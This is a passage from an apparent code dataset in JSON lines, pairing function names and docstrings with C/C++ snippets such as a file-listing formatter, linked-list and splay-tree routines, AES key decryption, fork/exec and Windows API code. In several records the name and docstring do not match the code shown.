\u043f\u0440\u043e\u0431\u0435\u043b\u0430\u043c\u0438\\n       *(oneStr + i) = \\' \\';\\n   switch(Conf.typeSize)                                     \/\/0-\u0431\u0430\u0439\u0442\u044b, 1-\u041a\u0431\u0430\u0439\u0442\u044b, 2-\u041c\u0431\u0430\u0439\u0442\u044b, 3-\u0413\u0411\u0430\u0439\u0442\u044b\\n   {  case 0: sprintf(size, \"%12.0lf\", double(pf->SizeF));\\n              as = Char_Dig_p(size, 15);  break;             \/\/\u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044c\u043d\u043e\u0433\u043e \u0447\u0438\u0441\u043b\u0430 \u0432 \u0440\u0430\u0437\u0440\u044f\u0434\u043a\u0443\\n      case 1: sprintf(size, \"%11.1lf\", double(pf->SizeF)\/1024.0);\\n              as = Char_Dig_p_n(size, 12, 1);  break;        \/\/\u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044c\u043d\u043e\u0433\u043e \u0447\u0438\u0441\u043b\u0430 \u0432 \u0440\u0430\u0437\u0440\u044f\u0434\u043a\u0443\\n      case 2: sprintf(size, \"%9.2lf\", double(pf->SizeF)\/1024.0\/1024.0);\\n              as = Char_Dig_p_n(size, 9, 2);  break;         \/\/\u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044c\u043d\u043e\u0433\u043e \u0447\u0438\u0441\u043b\u0430 \u0432 \u0440\u0430\u0437\u0440\u044f\u0434\u043a\u0443\\n      case 3: sprintf(size, \"%7.3lf\", double(pf->SizeF)\/1024.0\/1024.0\/1024.0);\\n              as = Char_Dig_p_n(size, 6, 3);  break;         \/\/\u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u043e\u0432\u0430\u043d\u0438\u0435 \u0441\u0438\u043c\u0432\u043e\u043b\u044c\u043d\u043e\u0433\u043e \u0447\u0438\u0441\u043b\u0430 \u0432 \u0440\u0430\u0437\u0440\u044f\u0434\u043a\u0443\\n   }\\n\/*\\n   if(prMEDIA == 1 && Conf.altName == 0 && tabMME != NULL)\\n     if((tabMME + indTabMME)->dt.year !=  pf.Year ||\\n        (tabMME + indTabMME)->dt.mon  !=  pf.Mon  ||\\n        (tabMME + indTabMME)->dt.day  !=  pf.Day  ||\\n        (tabMME + indTabMME)->dt.hour !=  pf.Hour ||\\n        (tabMME + indTabMME)->dt.min  !=  pf.Min  ||\\n        (tabMME + indTabMME)->dt.sec  !=  pf.Sec)\\n     {\\n        char sf[260], sb[260], ss[260];\\n        wsprintf(sf, \"\u0412 \u0444\u0430\u0439\u043b\u0435: %02d.%02d.%04d  %02d:%02d:%02d\", pf.Day, pf.Mon, pf.Year, pf.Hour, pf.Min, pf.Sec);\\n        wsprintf(sb, \"\u0412 \u0431\u0430\u0437\u0435:    %02d.%02d.%04d  %02d:%02d:%02d\",\\n                    (tabMME + indTabMME)->dt.day, (tabMME + indTabMME)->dt.mon, (tabMME + indTabMME)->dt.year,\\n                    (tabMME + indTabMME)->dt.hour, (tabMME + indTabMME)->dt.min, (tabMME + indTabMME)->dt.sec);\\n        WORD wHour = WORD((tabMME + indTabMME)->timeLong \/ 3600);\\n        int M1 = (tabMME + indTabMME)->timeLong - wHour * 3600;\\n        WORD wMinute = WORD(M1 \/ 60);\\n        WORD wSecond = WORD(M1 - wMinute * 60);\\n        wsprintf(ss, \"\u0414\u043b\u0438\u0442\u0435\u043b\u044c\u043d\u043e\u0441\u0442\u044c: %02d:%02d:%02d\", wHour, wMinute, wSecond);\\n        Error4(\"\u041d\u0435\u0441\u043e\u0432\u043f\u0430\u0434\u0435\u043d\u0438\u0435 \u0434\u0430\u0442:\", ss, sb, sf);\\n     }\\n*\/\\n   char sDate[64], sTime[64], Pr = \\' \\';\\n   SYSTEMTIME sysTime;\\n   if(prMEDIA == 1 && Conf.altName == 0 &&                   \/\/\u042d\u0442\u043e \u043f\u0430\u043f\u043a\u0430 MEDIA \u0438 \u0435\u0441\u0442\u044c \u043f\u0440\u0438\u0437\u043d\u0430\u043a \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0442\u0438\u0432\u043d\u043e\u0433\u043e \u0438\u043c\u0435\u043d\u0438\\n      tabMME != NULL && *(DWORD*)Ext == 0x006F7276 &&        \/\/\u0415\u0441\u0442\u044c \u043c\u0430\u0441\u0441\u0438\u0432 MME \u0438 \u0444\u0430\u0439\u043b \u0441 \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0438\u0435\u043c *.vro\\n      Conf.typeTime == 0 &&                                  \/\/0-\u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0442\u044c \u0432\u0440\u0435\u043c\u044f \u043d\u0430\u0447\u0430\u043b\u0430 \u0437\u0430\u043f\u0438\u0441\u0438, 1-\u0432\u0440\u0435\u043c\u044f \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u044f \u0444\u0430\u0439\u043b\u0430\\n      indTabMME != -1)                                       \/\/\u041d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u043e \u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0438\u0435 \u0438\u043c\u0435\u043d\\n   {  pf->Year = (tabMME + indTabMME)->dt.year;\\n\\t  pf->Mon = BYTE((tabMME + indTabMME)->dt.mon);\\n\\t  pf->Day = BYTE((tabMME + indTabMME)->dt.day);\\n\\t  pf->Hour = BYTE((tabMME + indTabMME)->dt.hour);\\n\\t  pf->Min = BYTE((tabMME + indTabMME)->dt.min);\\n\\t  pf->Sec = BYTE((tabMME + indTabMME)->dt.sec);\\n      Pr = \\'R\\';\\n   }\\n   sysTime.wYear = (pf->Year == 0) ? WORD(1900) : pf->Year;\\n   sysTime.wMonth = (pf->Mon == 0) ? WORD(1) : pf->Mon;\\n   sysTime.wDay = (pf->Day == 0) ? WORD(1) : pf->Day;\\n   sysTime.wHour = pf->Hour;\\n   sysTime.wMinute = pf->Min;\\n   sysTime.wSecond = pf->Sec;\\n   sysTime.wDayOfWeek = 1;\\n   sysTime.wMilliseconds = 0;\\n\\n   GetDateFormat(LOCALE_USER_DEFAULT, DATE_SHORTDATE, &sysTime, NULL, sDate, 64);\\n   GetTimeFormat(LOCALE_USER_DEFAULT, TIME_FORCE24HOURFORMAT | LOCALE_NOUSEROVERRIDE, &sysTime, NULL, sTime, 64);\\n\/*\\n   int prNoDT = 0;                                           \/\/\u041f\u0440\u0438\u0437\u043d\u0430\u043a \u043e\u0442\u0441\u0443\u0442\u0441\u0442\u0432\u0438\u044f \u0434\u0430\u0442\u044b\/\u0432\u0440\u0435\u043c\u0435\u043d\u0438 (\u0447\u0430\u0441\u044b \u043d\u0435 \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u044b)\\n   if((sysTime.wYear == 2004 && sysTime.wMonth == 1 && sysTime.wDay == 1) ||\\n       sysTime.wYear >= 2055 || sysTime.wYear < 2004) prNoDT = 1;                 \/\/\u041f\u0440\u0438\u0437\u043d\u0430\u043a \u043e\u0442\u0441\u0443\u0442\u0441\u0442\u0432\u0438\u044f \u0434\u0430\u0442\u044b\/\u0432\u0440\u0435\u043c\u0435\u043d\u0438 (\u0447\u0430\u0441\u044b \u043d\u0435 \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u044b)\\n   if(prNoDT == 1)                                           \/\/\u041f\u0440\u0438\u0437\u043d\u0430\u043a \u043e\u0442\u0441\u0443\u0442\u0441\u0442\u0432\u0438\u044f \u0434\u0430\u0442\u044b\/\u0432\u0440\u0435\u043c\u0435\u043d\u0438 (\u0447\u0430\u0441\u044b \u043d\u0435 \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043b\u0435\u043d\u044b)\\n   {  for(int i=0; i<sizeof(sDate); i++)\\n      {  if(*(sDate+i) == 0)  break;\\n         if(*(sDate+i) >= \\'0\\' && *(sDate+i) <= \\'9\\') *(sDate+i) = \\'-\\';\\n      }\\n      for(int i=0; i<sizeof(sTime); i++)\\n      {  if(*(sTime+i) == 0)  break;\\n         if(*(sTime+i) >= \\'0\\' && *(sTime+i) <= \\'9\\') *(sTime+i) = \\'-\\';\\n      }\\n   }\\n*\/\\n   if(prMEDIA == 1 && Conf.altName == 0 &&                   \/\/\u042d\u0442\u043e \u043f\u0430\u043f\u043a\u0430 MEDIA \u0438 \u0435\u0441\u0442\u044c \u043f\u0440\u0438\u0437\u043d\u0430\u043a \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0442\u0438\u0432\u043d\u043e\u0433\u043e \u0438\u043c\u0435\u043d\u0438\\n      tabMME != NULL && *(DWORD*)Ext == 0x006F7276 &&        \/\/\u0415\u0441\u0442\u044c \u043c\u0430\u0441\u0441\u0438\u0432 MME \u0438 \u0444\u0430\u0439\u043b \u0441 \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0438\u0435\u043c *.vro\\n      indTabMME != -1)                                       \/\/\u041d\u0435 \u043d\u0430\u0439\u0434\u0435\u043d\u043e \u0441\u043e\u043e\u0442\u0432\u0435\u0442\u0441\u0442\u0432\u0438\u0435 \u0438\u043c\u0435\u043d\\n   {  sysTime.wHour = WORD((tabMME + indTabMME)->timeLong \/ 3600);\\n      int M1 = (tabMME + indTabMME)->timeLong - sysTime.wHour * 3600;\\n      sysTime.wMinute = WORD(M1 \/ 60);\\n      sysTime.wSecond = WORD(M1 - sysTime.wMinute * 60);\\n      sysTime.wMilliseconds = 0;\\n      char sLTime[64];\\n      GetTimeFormat(LOCALE_USER_DEFAULT, TIME_FORCE24HOURFORMAT | LOCALE_NOUSEROVERRIDE, &sysTime, NULL, sLTime, 64);\\n      if(Conf.ViewVRO == 1)                                  \/\/0-\u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0442 \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0438\u0435 *.vro, 1-\u043d\u0435 \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0442\u044c\\n         for(int i=l-4; i<l; i++)                            \/\/\u0421\u0442\u0435\u0440\u043b\u0438 \u0440\u0430\u0441\u0448\u0438\u0440\u0435\u043d\u0438\u0435 .vro \u0438 \u0442\u043e\u0447\u043a\u0443\\n             *(oneStr + i) = \\' \\';\\n      int n = (Conf.poz_Ql == 0) ? 59 : 63;\\n      if(Conf.poz_In == 0)                                   \/\/\u0418\u0441\u0442\u043e\u0447\u043d\u0438\u043a \u0437\u0430\u043f\u0438\u0441\u0438: 0-\u0432 \u043a\u043e\u043b\u043e\u043d\u043a\u0435, 1-\u0432 \u0438\u043c\u0435\u043d\u0438, 2-\u043d\u0435 \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0442\u044c\\n         sprintf(oneStr + n,  \"%s        \", (tabMME + indTabMME)->nameIn);\\n      if(Conf.poz_Ql == 0)                                   \/\/\u041a\u0430\u0447\u0435\u0441\u0442\u0432\u043e \u0437\u0430\u043f\u0438\u0441\u0438: 0-\u0432 \u043a\u043e\u043b\u043e\u043d\u043a\u0435, 1-\u0432 \u0438\u043c\u0435\u043d\u0438, 2-\u043d\u0435 \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0442\u044c\\n         sprintf(oneStr + 66, \"%s        \", (tabMME + indTabMME)->Qual);\\n      sprintf(oneStr+70, \"%s %s  [%8s]  %c %10s  %8s\", as, strSize[Conf.typeSize], sLTime, Pr, sDate, sTime);\\n   }\\n   else  sprintf(oneStr + 52, \"%s %s  %10s  %8s\", as, strSize[Conf.typeSize], sDate, sTime);\\n   return 0;\\n}'}","id":107}
{"content":"{'function_name': 'insertatN', 'docstring': '\/\/ Insert at head \\r', 'code': 'int main() {\\r\\n    \\r\\n    int delnum;\\r\\n    \\r\\n    insert(1);\\r\\n    insert(2);\\r\\n    insert(3);\\r\\n    insert(4);\\r\\n    \\r\\n    printlist();\\r\\n\\r\\n    printf(\"##########\\\\n\");\\r\\n    insertatN(6, 2);\\r\\n    printlist();\\r\\n\\r\\n    deletenode(1);\\r\\n    \\r\\n    reverselist();\\r\\n    printf(\"\\\\n\\\\n\");\\r\\n    \\r\\n    printlist();\\r\\n    \\r\\n    delnum = findmiddle();\\r\\n    \\r\\n    printf(\"MIDDLE : %d\\\\n\", delnum);\\r\\n    \\r\\n    \/* Added for testing purpose *\/\\r\\n    addloop();\\r\\n    \\r\\n    struct node *loopnode = findloop();\\r\\n    printf(\"LoopNode : %d\\\\n\", loopnode->data);\\r\\n\\r\\n    removeloop();\\r\\n    printlist();\\r\\n\\r\\n    \\r\\n    return 0;\\r\\n}'}","id":114}
{"content":"{'function_name': 'decryptPbData', 'docstring': '\/\/\u89e3\u5bc6', 'code': 'int decryptPbKey(unsigned char *cipherData, int cipherDataLen, char *clientSN, char *seedKey, unsigned char *outPbKey) {\\n\\n\\tchar hardwareInfo[500];\\n\\tmemset(hardwareInfo, 0, 500);\\n\\tint infoLen = getHardwareInfo(hardwareInfo);\\n\\n\\t\/\/printf(\"getHardwareInfo:%d\\\\n \", hardwareInfo);\\n\\n\\tchar transSeedKey[50];\\n\\tmemset(transSeedKey, 0, 50);\\n\\tint transSeedLen;\/\/= transferSeedKey(seedKey, 50, transSeedKey);\\n\\n\\t\\t\\t\\t\\t \/\/transSeedKey=seedKey;\\n\\ttransSeedLen = 32;\\n\\n\\t\/\/\u5904\u7406\\n\\tchar orginalData[600];\\n\\tmemset(orginalData, 0, 600);\\n\\n\\tstrcat(orginalData, clientSN);\\n\\tstrcat(orginalData, \"_\");\\n\\tstrcat(orginalData, hardwareInfo);\\n\\t\/\/strcat(orginalData, \"_\");\\n\\t\/\/strcat(orginalData, seedKey);\\n\\n\\t\/\/printf(\"orginalData:%s len:%d\\\\n \", orginalData, strlen(orginalData));\\n\\n\\tchar md5Value[33];\\n\\tmemset(md5Value, 0, 33);\\n\\n\\tgetMd5WithSeed(orginalData, strlen(orginalData), seedKey, 16, md5Value);\\n\\n\\t\/\/printf(\" md5 value:%s \\\\n\", md5Value);\\n\\t\/\/===================================\\n\\n\\tunsigned char iv[AES_BLOCK_SIZE];\/\/\u52a0\u5bc6\u7684\u521d\u59cb\u5316\u5411\u91cf\\n\\tmemset(iv, 0, AES_BLOCK_SIZE);\\n\\n\\tAES_KEY aes;\\n\\tif (AES_set_decrypt_key((unsigned char*)md5Value, 128, &aes) < 0)\\n\\t{\\n\\t\\tprintf(\"init aes key error.\\\\n\");\\n\\t\\treturn 0;\\n\\t}\\n\\n\\tAES_cbc_encrypt((unsigned char*)cipherData, outPbKey, cipherDataLen, &aes, iv, AES_DECRYPT);\\n\\n\\n\\treturn 1;\\n\\n}'}","id":118}
{"content":"{'function_name': 'p_GeoDaWeight__GetSparsity', 'docstring': '\/\/ invoke the function', 'code': 'int p_GeoDaWeight__GetMinNeighbors(SEXP xp)\\n{\\n  \/\/ grab the object as a XPtr (smart pointer) to GeoDaWeight\\n  Rcpp::XPtr<GeoDaWeight> ptr(xp);\\n\\n  \/\/ invoke the function\\n  int min_nbrs = ptr->GetMinNbrs();\\n\\n  return min_nbrs;\\n}'}","id":125}
{"content":"{'function_name': 'sequentialCall', 'docstring': '\/\/ run sequential step case producing an immediate value', 'code': 'impl::reference::unreleased_treeture<O> parallelCall(impl::reference::dependencies<DepsKind>&& deps, const I& in, const Funs& ... funs) const {\\n\\t\\t\\t\/\/ check for the base case\\n\\t\\t\\tconst auto& base = this->base;\\n\\t\\t\\tif (bc_test(in)) {\\n\\t\\t\\t\\treturn impl::reference::spawn<root>(std::move(deps), [=] {\\n\\t\\t\\t\\t\\treturn detail::call_first().template call<O>(base, in);\\n\\t\\t\\t\\t});\\n\\t\\t\\t}\\n\\n\\t\\t\\t\/\/ run step case\\n\\t\\t\\tconst auto& step = this->step;\\n\\t\\t\\treturn impl::reference::spawn<root>(\\n\\t\\t\\t\\t\\t\/\/ the dependencies of the new task\\n\\t\\t\\t\\t\\tstd::move(deps),\\n\\t\\t\\t\\t\\t\/\/ the process version (sequential):\\n\\t\\t\\t\\t\\t[=] { return detail::call_last().template call<impl::sequential::unreleased_treeture<O>>(step, in, funs.sequential_call()...).get(); },\\n\\t\\t\\t\\t\\t\/\/ the split version (parallel):\\n\\t\\t\\t\\t\\t[=] { return detail::call_first().template call<impl::reference::unreleased_treeture<O>>(step, in, funs.parallel_call()...); }\\n\\t\\t\\t);\\n\\t\\t}'}","id":130}
{"content":"{'function_name': 'parsePathsFile', 'docstring': '\/\/ Note: we do not free() the malloc buffer, because the strings in it are used by exec()', 'code': 'static int run(const char* path, const std::vector<const char*>& args, bool affinity=false)\\n{\\n\\t\/\/ build NULL termintated argv[] with argv[0] being path to exectuable \\n\\tconst char* argv[args.size()+2];\\n\\targv[0] = path;\\n\\tint i=1;\\n\\tfor(std::vector<const char*>::const_iterator it=args.begin(); it != args.end(); ++it) {\\n\\t\\targv[i++] = *it;\\n\\t}\\n\\targv[i] = NULL;\\n\\n\\t\/\/ fork and exec\\n\\tpid_t pid = fork();\\n\\tswitch(pid) {\\n\\tcase -1:\\t\/\/ error\\n\\t\\treturn -1;\\n\\tcase 0:\\t\\t\/\/ child\\n\\t\\tif ( affinity ) {\\n#if __i386__\\n\\t\\t\\tint mib[] = { CTL_KERN, KERN_AFFINITY, 1, 1 };\\n\\t\\t\\tint namelen = 4;\\n\\t\\t\\tsysctl(mib, namelen, NULL, NULL, NULL, 0);\\n#endif\\n\\t\\t}\\n\\t\\texecv(path, (char**)argv);\\n\\t\\t_exit(127);\\n\\tdefault:\\t\/\/ parent \\n\\t\\tint childStatus;\\n\\t\\tif (waitpid (pid, &childStatus, 0) != pid)\\n\\t\\t\\treturn -1;\\n\\t\\treturn childStatus;\\n\\t}\\n}'}","id":136}
{"content":"{'function_name': 'condition_to_capnp', 'docstring': '\/\/ ops vectors when the current query condition.', 'code': \"Status reader_to_capnp(\\n    const Query& query,\\n    const Reader& reader,\\n    capnp::QueryReader::Builder* reader_builder) {\\n  const auto& array_schema = query.array_schema();\\n\\n  \/\/ Subarray layout\\n  const auto& layout = layout_str(query.layout());\\n  reader_builder->setLayout(layout);\\n\\n  \/\/ Subarray\\n  auto subarray_builder = reader_builder->initSubarray();\\n  RETURN_NOT_OK(\\n      subarray_to_capnp(array_schema, query.subarray(), &subarray_builder));\\n\\n  \/\/ Read state\\n  RETURN_NOT_OK(read_state_to_capnp(array_schema, reader, reader_builder));\\n\\n  const auto& condition = query.condition();\\n  if (condition.has_value()) {\\n    auto condition_builder = reader_builder->initCondition();\\n    RETURN_NOT_OK(condition_to_capnp(condition.value(), &condition_builder));\\n  }\\n\\n  \/\/ If stats object exists set its cap'n proto object\\n  stats::Stats* stats = reader.stats();\\n  if (stats != nullptr) {\\n    auto stats_builder = reader_builder->initStats();\\n    RETURN_NOT_OK(stats_to_capnp(*stats, &stats_builder));\\n  }\\n\\n  return Status::Ok();\\n}\"}","id":138}
{"content":"{'function_name': 'TerminateLease', 'docstring': '\/\/', 'code': 'WINAPI \\nGetLeasingApplicationExpirationTime(\\n    __in HANDLE LeasingApplication,\\n    __in LONG RequestTimeToLiveMilliseconds,\\n    __out PLONG RemainingTimeToLiveMilliseconds,\\n    __out PLONGLONG KernelCurrentTime\\n    )\\n\\n\/*++\\n \\nRoutine Description:\\n \\n    Gets the time for which the local application is guaranteed to have valid leases.\\n \\nParameters Description:\\n \\n    LeaseApplication - lease application handle.\\n\\n    RemainingTimeToLiveMilliseconds - on return, it contains the current lease \\n        expiration time in milliseconds.\\n\\n    KernelCurrentTime - on return, contains the kernel system time\\n \\nReturn Value:\\n \\n    TRUE if arguments are valid, FALSE otherwise.\\n \\n--*\/\\n\\n{\\n    DWORD BytesReturned = 0;\\n\\n    GET_LEASING_APPLICATION_EXPIRATION_INPUT_BUFFER DeviceIoctlGetTTLInputBuffer;\\n    ZeroMemory(&DeviceIoctlGetTTLInputBuffer, sizeof(GET_LEASING_APPLICATION_EXPIRATION_INPUT_BUFFER));\\n    GET_LEASING_APPLICATION_EXPIRATION_OUTPUT_BUFFER DeviceIoctlGetTTLOutputBuffer;\\n    ZeroMemory(&DeviceIoctlGetTTLOutputBuffer, sizeof(GET_LEASING_APPLICATION_EXPIRATION_OUTPUT_BUFFER));\\n\\n    \/\/\\n    \/\/ Check to see if the user mode lease layer \\n    \/\/ has been successfully initialized.\\n    \/\/\\n\\n    if (!IsInitializeCalled)\\n    {\\n        AcquireExclusiveLock lock(*LeaseLayerLock);\\n        {\\n            if (!IsInitializeCalled)\\n            {\\n                InitializeLeaseLayer();\\n                IsInitializeCalled = TRUE;\\n            }\\n        }\\n    }\\n\\n    if (!IsLeaseLayerInitialized()) {\\n\\n        return FALSE;\\n    }\\n\\n    \/\/\\n    \/\/ Check arguments.\\n    \/\/\\n    if (NULL == RemainingTimeToLiveMilliseconds ||\\n        NULL == KernelCurrentTime ||\\n        NULL == LeasingApplication ||\\n        INVALID_HANDLE_VALUE == LeasingApplication\\n        ) {\\n\\n        SetLastError(ERROR_INVALID_PARAMETER);\\n\\n        return FALSE;\\n    }\\n\\n    \/\/\\n    \/\/ Populate device IOCTL input buffer.\\n    \/\/\\n    DeviceIoctlGetTTLInputBuffer.LeasingApplicationHandle = LeasingApplication;\\n    DeviceIoctlGetTTLInputBuffer.RequestTimeToLive = RequestTimeToLiveMilliseconds;\\n\\n    if (RequestTimeToLiveMilliseconds > 0)\\n    {\\n        LeaseLayerEvents.GetContainerLeasingTTL(LONGLONG(LeasingApplication), RequestTimeToLiveMilliseconds);\\n    }\\n\\n    \/\/\\n    \/\/ Send the add leasing application Device IOCTL.\\n    \/\/\\n    auto DeviceIoctlReturn = DeviceIoControl(\\n        IOCTL_GET_LEASING_APPLICATION_EXPIRATION_TIME,\\n        &DeviceIoctlGetTTLInputBuffer,\\n        sizeof(GET_LEASING_APPLICATION_EXPIRATION_INPUT_BUFFER),\\n        &DeviceIoctlGetTTLOutputBuffer, \\n        sizeof(GET_LEASING_APPLICATION_EXPIRATION_OUTPUT_BUFFER),\\n        &BytesReturned);\\n    *KernelCurrentTime = DeviceIoctlGetTTLOutputBuffer.KernelSystemTime;\\n    *RemainingTimeToLiveMilliseconds = DeviceIoctlGetTTLOutputBuffer.TimeToLive;\\n    \/\/\\n    \/\/ Check return code of DeviceIoControl.\\n    \/\/\\n    if (NT_SUCCESS(DeviceIoctlReturn)) {\\n        \/\/\\n        \/\/ We are expecting non-empty output buffer.\\n        \/\/\\n        ASSERT_IFNOT(\\n            sizeof(GET_LEASING_APPLICATION_EXPIRATION_OUTPUT_BUFFER) == BytesReturned,\\n            \"GetLeasingApplicationExpirationTime IOCTL return size is wrong \");\\n        ASSERT_IFNOT(0 <= *RemainingTimeToLiveMilliseconds, \"GetLeasingApplicationExpirationTime RemainingTimeToLiveMilliseconds < 0 \");\\n\\n        return TRUE;\\n    }\\n\\n    return FALSE;\\n}'}","id":140}
{"content":"{'function_name': 'Max', 'docstring': '\/\/\u6c42n\u4e2a\u6570\u7684max ', 'code': 'void push_down(Splay *x){\/\/\u4e0b\u653e\u6807\u8bb0 \\n\\tif(x==null)return;\\n\\tif(x->rev){\/\/\u533a\u95f4\u7ffb\u8f6c \\n\\t\\tx->rev=0,x->son[0]->rev^=1,x->son[1]->rev^=1;\\n\\t\\tswap(x->son[0],x->son[1]),swap(x->maxl,x->maxr);\\n\\t}\\n\\tif(x->same){\/\/\u533a\u95f4\u8d4b\u503c \\n\\t\\tx->same=0,x->son[0]->key=x->son[1]->key=x->key;\\n\\t\\tx->son[0]->same=x->son[1]->same=1;\\n\\t\\tx->sum=x->key*x->size;\\n\\t\\tx->maxl=x->maxr=x->maxt=(x->key>0?x->sum:x->key);\\n\\t}\\n}'}","id":141}
{"content":"{'function_name': 'BubbleSort', 'docstring': '\/\/sorting', 'code': 'int main(){\\n\\tint x = 8;\\n\\tint arrAngka[] = {5,34,32,25,75,42,22,2};\\n\\n\\tcout << \"Data Sebelum Diurutkan\"<<endl;\\n\\tfor (int i = 0; i < 8; i++)\\n\\t{\\n\\t\\tcout<<arrAngka[i]<<\"  \";\\n\\t}\\n\\tcout<<endl<<endl;\\n\\tcout << \"Data Sebelum Diurutkan\"<<endl;\\n\\tBubbleSort(arrAngka,x);\\n\\t\/\/ SelectionSort(arrAngka,x);\\n\\tcout<<endl;\\n\\treturn 0;\\n}'}","id":147}
{"content":"{'function_name': 'SEXYHOOK_BEGIN', 'docstring': '\/\/\u4eee\u60f3\u30e1\u30bd\u30c3\u30c9', 'code': 'SEXYHOOK_BEGIN(int,SEXYHOOK_CLASS,&Child::g,())\\n\\t\\t\\t{\\n\\t\\t\\t\\treturn 103;\\t\/\/Child::g\\n\\t\\t\\t}'}","id":151}
{"content":"{'function_name': 'MimeOleGetContentTypeExt', 'docstring': '\/\/ Done\\r', 'code': 'MIMEOLEAPI MimeOleVariantFree(LPPROPVARIANT pProp)\\r\\n{\\r\\n    \/\/ Locals\\r\\n    HRESULT     hr=S_OK;\\r\\n\\r\\n    \/\/ Invalid Arg\\r\\n    Assert(pProp);\\r\\n\\r\\n    \/\/ Handle Variant Type...\\r\\n    switch(pProp->vt)\\r\\n    {\\r\\n    case VT_NULL:\\r\\n    case VT_EMPTY:\\r\\n    case VT_ILLEGAL:\\r\\n    case VT_UI1:\\r\\n    case VT_I2:\\r\\n    case VT_UI2:\\r\\n    case VT_I4:\\r\\n    case VT_UI4:\\r\\n    case VT_I8:\\r\\n    case VT_UI8:\\r\\n    case VT_R4:\\r\\n    case VT_R8:\\r\\n    case VT_CY:\\r\\n    case VT_DATE:\\r\\n    case VT_BOOL:\\r\\n    case VT_ERROR:\\r\\n    case VT_FILETIME:\\r\\n        break;\\r\\n\\r\\n    case VT_CF:\\r\\n    case VT_CLSID:\\r\\n    case VT_LPWSTR:\\r\\n    case VT_LPSTR:\\r\\n        if ((LPVOID)pProp->pszVal != NULL)\\r\\n            MemFree((LPVOID)pProp->pszVal);\\r\\n        break;\\r\\n\\r\\n    case VT_BLOB:\\r\\n        if (pProp->blob.pBlobData)\\r\\n            MemFree(pProp->blob.pBlobData);\\r\\n        break;\\r\\n\\r\\n    case VT_STREAM:\\r\\n        if (pProp->pStream)\\r\\n            pProp->pStream->Release();\\r\\n        break;\\r\\n\\r\\n    case VT_STORAGE:\\r\\n        if (pProp->pStorage)\\r\\n            pProp->pStorage->Release();\\r\\n        break;\\r\\n\\r\\n    default:\\r\\n        Assert(FALSE);\\r\\n        hr = TrapError(E_INVALIDARG);\\r\\n        break;\\r\\n    }\\r\\n\\r\\n    \/\/ Init\\r\\n    MimeOleVariantInit(pProp);\\r\\n\\r\\n    \/\/ Done\\r\\n    return hr;\\r\\n}'}","id":153}
{"content":"{'function_name': 'citanje_trajanja_poslova', 'docstring': '\/\/citanje datoteke red po red', 'code': 'void citanje_zavrsetaka_poslova(int N){\\n\\n\\t\/\/varijabla za u\u010ditavanje redova\\n\\tstring redak;\\n\\t\/\/brojac redaka\\n\\tint brojac=0;\\n\\t\/\/pocetna vrijednost u datoteci\\n\\tint redovi, kolone;\\n\\t\/\/broj poslova u ovom ispitivanju\\n\\tint broj_aktivnih_poslova=vektor_poslova[N];\\n\\n\\t\/\/ime glavne ulazne datoteke\\n\\tifstream ulazna(zavrsetci_poslova.c_str());\\n\\n\\tif(!ulazna){\\n\\t\\tcout<<\"Pogreska prilikom otvaranja datoteke! Datoteka \"<<dolasci_poslova<<\" nije uspjesno otvorena ili se ne nalazi u trenutnom direktoriju\"<<endl;\\n\\t\\treturn;\\n\\t}\\n\\n\\t\/\/citanje datoteke red po red\\n\\twhile(getline(ulazna,redak)){\\n\\n\\t\\tstring poms;\\n\\t\\tstringstream sTok(redak);\\n\\t\\t\/\/ucitavam sTok u poms\\n\\t\\tint pomi;\\n\\n\\t\\tif(brojac==0){\\n\\t\\t\\tsTok>>redovi;\\n\\t\\t\\tsTok>>kolone;\\n\\n\\t\\t\\tif((redovi!=konstante.broj_skupova) || (kolone!=konstante.max_br_poslova)){\\n\\t\\t\\t\\tcout<<\"Procitana datoteka nije kompatibilna sa zadanim problemom. Prekid rada.\"<<endl;\\n\\t\\t\\t\\treturn;\\n\\t\\t\\t}\\n\\t\\t}\\n\\n\\t\\tif(brojac==(N+1)){\\n\\t\\t\\tint i=0;\\n\\t\\t\\twhile(sTok>>pomi){\\n\\t\\t\\t\\tposlovi[i].Deadline=pomi;\\n\\t\\t\\t\\ti++;\\n\\n\\t\\t\\t\\tif(i==broj_aktivnih_poslova)\\n\\t\\t\\t\\t\\tbreak;\\n\\t\\t\\t}\\n\\t\\t\\tbreak;\\n\\t\\t}\\n\\n\\t\\tbrojac++;\\n\\t}\\n}'}","id":155}
